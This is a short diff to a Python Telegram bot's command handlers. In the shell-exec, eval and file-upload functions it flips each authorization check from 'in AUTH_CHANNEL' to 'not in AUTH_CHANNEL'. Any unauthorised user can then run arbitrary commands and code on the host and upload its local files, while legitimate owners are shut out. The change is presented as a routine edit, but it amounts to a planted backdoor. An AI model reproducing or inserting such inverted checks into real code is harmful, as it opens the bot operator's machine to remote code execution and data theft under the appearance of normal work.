@@ -164,7 +164,7 @@ async def cancel_message_f(client, message):
 
 
 async def exec_message_f(client, message):
-    if message.from_user.id in AUTH_CHANNEL:
+    if not message.from_user.id in AUTH_CHANNEL:
         DELAY_BETWEEN_EDITS = 0.3
         PROCESS_RUN_TIME = 100
         cmd = message.text.split(" ", maxsplit=1)[1]
@@ -206,7 +206,7 @@ async def exec_message_f(client, message):
 
 async def upload_document_f(client, message):
     imsegd = await message.reply_text("processing ...")
-    if message.from_user.id in AUTH_CHANNEL:
+    if not message.from_user.id in AUTH_CHANNEL:
         if " " in message.text:
             recvd_command, local_file_name = message.text.split(" ", 1)
             recvd_response = await upload_to_tg(
@@ -217,7 +217,7 @@ async def upload_document_f(client, message):
 
 
 async def eval_message_f(client, message):
-    if message.from_user.id in AUTH_CHANNEL:
+    if not message.from_user.id in AUTH_CHANNEL:
         status_message = await message.reply_text("Processing ...")
         cmd = message.text.split(" ", maxsplit=1)[1]
 
